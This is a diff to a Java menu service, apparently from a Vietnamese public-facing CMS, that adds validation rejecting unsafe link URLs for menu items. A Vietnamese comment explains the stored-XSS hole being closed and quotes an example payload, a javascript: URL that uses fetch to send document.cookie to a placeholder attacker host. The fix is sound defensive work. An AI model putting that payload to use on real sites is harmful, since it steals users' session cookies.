@@ -22,6 +22,7 @@ import com.songnhue.core.common.error.ErrorCode;
 import com.songnhue.core.common.exception.BusinessRuleException;
 import com.songnhue.core.common.exception.ResourceNotFoundException;
 import com.songnhue.core.common.tree.MaterializedPath;
+import com.songnhue.core.common.util.DiaChiLienKet;
 import com.songnhue.core.spi.AttachmentPort;
 import com.songnhue.core.spi.AttachmentRef;
 import com.songnhue.core.spi.AttachmentUploadCommand;
@@ -232,6 +233,19 @@ public class MenuService {
             case URL, EXTERNAL_DOC -> {
                 if (target.url() == null || target.url().isBlank()) {
                     throw new BusinessRuleException(ErrorCode.CMS_2012);
+                }
+                // ⛔⛔ T63.4 (ASVS 5.3.3). Trước bản này, nhánh đây chỉ hỏi "có rỗng ⛔" — nên
+                //    `javascript:fetch('//kẻ-gian/?c='+document.cookie)` lưu được vào
+                //    `menu_items.url`, và cổng công khai đưa thẳng vào `href`. React 18.3.1 chỉ
+                //    CẢNH BÁO chứ ⛔ chặn (chặn từ React 19) ⇒ người dân bấm vào mục menu là nó chạy.
+                //
+                // ⚠ Vế HIỂN THỊ đã bọc từ T61.34 (`lienKetAnToan.ts`) và vế ấy đủ để ⛔ ai bấm
+                //   trúng. Chốt ở đây trả lời một câu khác: **⛔ để chuỗi xấu vào CSDL**. Lý do là
+                //   luật 12 — đường hiển thị viết sau này ⛔ tự nhiên biết phải bọc, bản xuất cấu
+                //   hình mang nó đi nơi khác, và quan trọng nhất: người quản trị nhận được lời báo
+                //   NGAY LÚC LƯU thay vì một mục menu lặng lẽ ⛔ bấm được mà ⛔ ai biết vì sao.
+                if (!DiaChiLienKet.anToan(target.url())) {
+                    throw new BusinessRuleException(ErrorCode.CMS_2024);
                 }
             }
             case NONE -> {
